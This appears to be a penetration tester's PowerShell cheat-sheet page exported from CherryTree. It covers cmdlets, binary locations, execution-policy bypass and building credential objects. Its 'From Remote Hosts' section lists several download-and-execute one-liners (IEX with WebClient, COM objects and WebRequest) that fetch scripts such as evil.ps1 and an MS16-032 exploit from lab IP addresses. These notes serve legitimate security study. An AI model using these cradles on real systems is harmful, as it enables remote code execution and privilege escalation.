<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PowerShell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># PowerShell</h1></strong><br /><br /><strong><h2>## cmdlets</h2></strong><br />cmdlets are used to perform an action. <br />A .NET object gets returned.<br />They&#39;re NOT executables<br />You can write your own cmdlet with a few lines of script.<br /><br /><code>Get-Command -CommandType cmdlet</code> - list all cmdlets<br /><br />Interesting cmdlets:<br />• <code>Get-Process</code> - list running processes<br /><br /><strong><h2>## Modules</h2></strong><br /><code>Import-Module &lt;module path&gt;</code> - import a module<br /><code>Get-Command -Module &lt;module name&gt;</code> - list commands in a module<br /><br /><strong><h2>## Location</h2></strong><br /><a href="https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations">https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations</a><br /><br /><strong><h3>### on 32bit Windows</h3></strong><br />The 32bit PowerShell binary on 32bit Windows systems is stored at:<br /><code>C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe</code><br /><br /><strong><h3>### on 64bit Windows</h3></strong><br />The 32bit PowerShell binary on 64bit Windows is stored at:<br /><code>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code><br /><br />The 64bit PowerShell binary on 64bit Windows is stored at:<br /><code>C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe</code><br /><br />To access 64bit PowerShell from a 32bit process on 64bit Windows, you can browse to:<br /><code>C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe</code><br />   ◇ SysNative is a virtual folder used to access the 64bit system32 folder from a 32bit application or script<br />      ▪ <a href="https://www.samlogic.net/articles/sysnative-folder-64-bit-windows.htm">https://www.samlogic.net/articles/sysnative-folder-64-bit-windows.htm</a><br />      ▪ It&#39;s invisible to 64bit in Explorer/CMD/PowerShell<br />      ▪ Only 32bit processes will be able to see/access the file<br /><br /><strong><h2>## Run PowerShell Scripts</h2></strong><br /><code>IEX</code> = Invoke Expressions<br /><br /><strong><h3>### Locally</h3></strong><br /><code>script.ps1</code><br /><code>.\script.ps1</code><br /><code>./script.ps1</code><br /><code>C:\Users\bob\Desktop\script.ps1</code> - Using the full path always works<br /><br /><strong><h3>### From Remote Hosts</h3></strong><br /><strong>#### IEX</strong><br /><div class="codebox"><div class="codebox">IEX(New-Object&nbsp;Net.WebClient).downloadString(&#39;http://10.10.14.8:8000/ms16.ps1&#39;)</div></div><br /><br />Run script and invoke a function within script on 1 line:<br /><div class="codebox"><div class="codebox">IEX(New-Object&nbsp;Net.WebClient).downloadString(&#39;http://10.10.14.8:8000/ms16.ps1&#39;);&nbsp;Invoke-MS16-032</div></div><br /><br /><strong>#### COM Object</strong><br /><div class="codebox"><div class="codebox">$ie=New-Object&nbsp;-ComObject&nbsp;InternetExplorer.Application;&nbsp;$ie.visible=$False;&nbsp;$ie.navigate(&#39;http://webserver/payload.ps1&#39;);&nbsp;sleep&nbsp;5;&nbsp;$response=$ie.Document.body.innerHTML;$ie.quit();&nbsp;iex&nbsp;$response</div></div><br /><br /><strong><h3>### From Remote Hosts using PowerShell v3</h3></strong><br /><strong>#### IEX</strong><br /><div class="codebox"><div class="codebox">iex(iwr&nbsp;&#39;http://192.168.1.52/evil.ps1&#39;)</div></div><br /><br /><strong>#### COM Object</strong><br /><div class="codebox"><div class="codebox">$h=New-Object&nbsp;-ComObject&nbsp;Msxm12.XMLHTTP;&nbsp;$h.open(&#39;GET&#39;,&nbsp;&#39;http://192.168.1.52/evil.ps1&#39;,$false);&nbsp;$h.send();&nbsp;iex&nbsp;$h.responseText<br /></div></div><br /><br /><strong>#### .NET.WebRequest</strong><br /><div class="codebox"><div class="codebox">$wr&nbsp;=&nbsp;[System.NET.WebRequest]::Create(&quot;http://192.168.1.52/evil.ps1&quot;)<br />$r&nbsp;=&nbsp;$wr.GetResponse()<br />iex&nbsp;([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()</div></div><br /><br /><strong><h2>## Bypass Execution Policies</h2></strong><br />• <a href="https://bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/">https://bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/</a><br />• <a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/</a><br /><br />Execution policies are not a security measure.<br />They exist to prevent the user from accidently executing scripts.<br /><br /><strong><h3>### Check your script execution privileges</h3></strong><br /><code>Get-ExecutionPolicy</code><br /><code>Get-ExecutionPolicy -List | Format-Table -AutoSize</code><br /><br /><strong><h3>### Bypass Execution Policy</h3></strong><br /><code>powershell -ExecutionPolicy bypass</code><br /><code>powershell -c &lt;cmd&gt;</code><br /><code>powershell -encodedcommand</code><br /><code>$env:PSExecutionPolicyPreference=&quot;bypass&quot;</code><br /><br /><strong><h3>### Set the ExecutionPolicy for the Process Scope</h3></strong><br />• The execution policy can be set to unrestricted for the duration of your session<br />• This doesn&#39;t cause a configuration change<br />• It also doesn&#39;t write to the disk<br /><br /><code>Set-ExecutionPolicy Bypass -Scope Process</code><br /><code>.\script.ps1</code><br /><br /><strong><h2>## Store Credentials for Use on the cmdline</h2></strong><br />PowerShell doesn&#39;t like you passing credentials (specifically the password) in plaintext to commands.<br />Instead, you have to create a variable to store the credentials like this:<br /><br /><code>$creds = New-Object System.Management.Automation.PSCredential(&#39;Administrator&#39;, $secretPassword)</code><br /><br />You can then use the creds with commands with <code>-Credential $creds</code><br />Check creds with <code>$&lt;variable name&gt;</code><br /><br /><strong><h3>### Method #1</h3></strong><br /><div class="codebox"><div class="codebox">$username&nbsp;=&nbsp;&quot;BART\Administrator&quot;<br />$password&nbsp;=&nbsp;&quot;3130438f31186fbaf962f407711faddb&quot;<br />$secstr&nbsp;=&nbsp;New-Object&nbsp;-TypeName&nbsp;System.Security.SecureString<br />$password.ToCharArray()&nbsp;|&nbsp;ForEach-Object&nbsp;{$secstr.AppendChar($_)}<br />$cred&nbsp;=&nbsp;new-object&nbsp;-typename&nbsp;System.Management.Automation.PSCredential&nbsp;-argumentlist&nbsp;$username,&nbsp;$secstr<br /><br />#&nbsp;Use&nbsp;creds<br />&lt;command&gt;&nbsp;-Credential&nbsp;$cred</div></div><br /><br /><strong><h3>### Method #2</h3></strong><br /><div class="codebox"><div class="codebox">$secretPassword&nbsp;=&nbsp;ConvertTo-SecureString&nbsp;&#39;p4ssword&#39;&nbsp;-AsPlainText&nbsp;-Force<br />$secretCreds&nbsp;=&nbsp;New-Object&nbsp;System.Management.Automation.PSCredential(&#39;Administrator&#39;,&nbsp;$secretPassword)<br /><br />#&nbsp;Use&nbsp;creds<br />&lt;command&gt;&nbsp;-Credential&nbsp;$secretCreds</div></div><br /><br /><strong><h2>## Useful commands</h2></strong><br />Help<br /><code>Get-Help &lt;command&gt;</code><br /><br />Locate<br /><code>Get-ChildItem -Recurse C:\ file.txt</code><br /><code>gci -r C:\ file.txt</code><br /><br />Pipe to file<br /><code>&lt;command&gt; | Out-File output.txt</code><br /></div>
</body>
</html>
